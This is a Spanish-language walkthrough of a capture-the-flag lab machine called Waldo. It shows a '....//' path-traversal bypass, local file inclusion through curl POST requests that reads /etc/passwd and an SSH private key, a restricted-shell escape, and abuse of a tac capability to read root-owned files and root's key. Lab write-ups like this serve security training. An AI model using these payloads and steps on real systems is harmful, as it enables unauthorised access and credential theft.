## Summary

- IP -> 10.10.10.87
- Ports -> TCP (22, 80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> Open SSH 7.5
    - 80 -> http nginx 1.12.2


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80

En la pagina, en list2 podemos colocar < h1>Hola< /h1> y nos lo interpreta

Abrimos BurpSuite y recargamos la pagina para poder ver algo 
Mandamos el codigo al Repeater y miramos lo siguiente cuando lo enviamos
	.
	..
	list1
	list2
	
Quiere decir que hay un directorio actual y un anterior de trabajo, ademas de los list que nos salen en la pagina web.

Podemos hacer un **Directory Path Transversal**
**../../../** -> Pero nos damos cuenta que al momento de colocar eso no nos hace nada, por lo que podrian estar haciendo sanitizacion 
Ahora lo colocamos doble resultando asi **....//....//** y asi cuando aplique sanitizacion se quedara de esta manera **../../**

Tenemosun **Directory Listing** 
- **....//** Podemos ver las carpetas atras y podriamos llegar a la raiz, a nivel de Directorios

Ahora con BurpSuite nos ponemos a analizar la parte donde esta el file1
Ahora tenemos un **Local File Inclusion por POST** ya que podemos poner muchos **....//....//** para llegar a la raiz y poder ver el siguiente archivo, a nivel de Archivos
- **....//....//....//....//....//....//etc/passwd**

En este caso para ver mejor el contenido de arriba por Burpsuite, aplicamos el siguiente comando
- Comando -> **curl -s -X POST http://< IP>/fielRead.php -d 'file=./.list/....//....//....//....//etc/passwd'** Miramos la resuesta por POST de la pagina web, y a nivel de (d=data) le pasamos eso 
	- fileRead.php -> lo buscamos en el BurpSuite en la cabecera de POST
- Comando -> **curl -s -X POST http://< IP>/fielRead.php -d 'file=./.list/....//....//....//....//etc/passwd' | jq '.{"file"}' -r** Como es Json lo cambiamos a su formato (r=raw) y ya lo podemos ver mas bonito
	- Rutas que podemos colocar en el file=**./.list/....//....//....//....//home**
Podemos encontrar el .monitor que cuando lo miramos en nuestra consola es un RSA Private Key 
	- Rutas que podemos colocar en el file=**./.list/....//....//....//....//home/nobody/.ssh/.monitor**

Metemos el contenido a un archivo llamado is_rsa en nuestar consola, para despues conectarnos por SSH
- Comando -> **curl -s -X POST http://< IP>/fielRead.php -d 'file=./.list/....//....//....//....//etc/passwd' | jq '.{"file"}' -r** > ../content/**id_rsa**
- Comando -> **chmod 600 id_rsa** Le cambiamos los permisos a un archivo, las claves rsa deben de poseer el privilegio 600

## User
Por lo que nos conectamos por SSH 
- Comando -> **ssh -i id_rsa < user>@< IP>** Nos conectamos por ssh teniendo un id_rsa con privilegio 600
Una vez conectado buscamos el archivo user.txt

Agregamos nuestro PATH a la maquina victima
- Comando -> **id** Identificador de los usuarios (UID), root=UID=0
- Comando -> **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
- Comando -> **find / -perm -4000 -user root 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios pero en este caso del usuario root
- Comando -> **cat /etc/crontab** Tareas CRON, que son tareas que se ejecutan a intervalos regulares de tiempos en el sistema 
- Comando -> **ps -e command** Para ver los procesos, comandos que se estan ejecutando y asi poder ganar privilegios

**cd .ssh** -> Nos movemos al dir ssh y le hacemos un **ls -la**
**cat authorized_keys ; echo** -> Podemos ver el contenido del archivo, por lo que vemos que hay un usuario llamado **monitor@waldo** (echo=para hacer en este caso, salto de linea)

Por lo que tratamos de conectarnos de forma local:
**ssh monitor@waldo**

Como no se pudo volvemos a conectarnos como lo hicimos anterirmente con la clave privada que la contiene (.monitor):
**ssh -i .monitor monitor@localhost**
Ingresamos a una restricted bash 

- Comando -> **ssh -i .monitor monitor@localhost bash** Podemos ejecuta un comando, y no nos cargara la restricted bash, y en este caso podemos hacer que nos de una bash. 
Le damos tratamiento:
	- Tratamiento de la consola Linux cuando entras a una maquina victima
			 - **Script /dev/null -c bash** Nos sales que esto no se puede hacer, por lo que hacemos lo siguiente
			 - **Ctrl + z**
			 - **stty raw -echo; fg**
			 -  **reset xterm**
			- **export TERM=xterm** Para poder hacer Ctrl +c y Ctrl + l (l=ele)
			- **export SHELL=/bin/bash**Hacemos que shell ahora valga bash

Aveces no podemos colocar reset por lo mismo que estabamos en una restricted bash, por lo que podemos agregar nuestro PATH y se solcuiona el problema

Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano

- Comando -> **hostname -I** Miramos nuestra interface (I=i mayuscula)
- Comando -> **ls -l** Miramos lo que hay en el directorio 
- Comando -> **id** Identificador de los usuarios (UID), root=UID=0
- Comando -> **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
- Comando -> **find .** Para ver archivos y sus extensiones y asi ver si podemos ejecutar alguno
	Por lo que encontramos ./monitor/app-dev/logMonitor 
- Comando -> **file ./monitor/app-dev/logMonitor** Nos muestra que tipo de archivo es por los magic numbers y es un ejecutable
- Comando -> **find / -perm -4000 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios,
- Comando -> **which getcap** Para ver si esta instalado el Getcap y mirar las capabilities

* Comando -> **getcap -r / 2>/dev/null** Listamos las capabilities que existan desde la raiz de forma recursiva

## Root

El tac es un cat pero te muestra el contenido al reves
		***/usr/bin/tac* = cap_dac_read_search+ei** Con esta capabilitie podemos utilizar ese comando para poder leer cualquier archivo privilegiado del sistema
		- Comando -> **tac /root/root.txt** Podemos colocar un archivo de alguna ruta como /etc/shadow, etc... o un file directamente y lo hara como root 

Tambien pordemos conectarnos al usuario root obteniendo su clave privada de la siguente manera:
- Comando -> **tac /root/.ssh/id_rsa | tac** Podemos ver la clave privada del usuario root y podernos conectar por ssh con esa id_rsa, pero en este caso no se puede porque el root no puede hacer login 

Por lo que leemos la flag root.txt 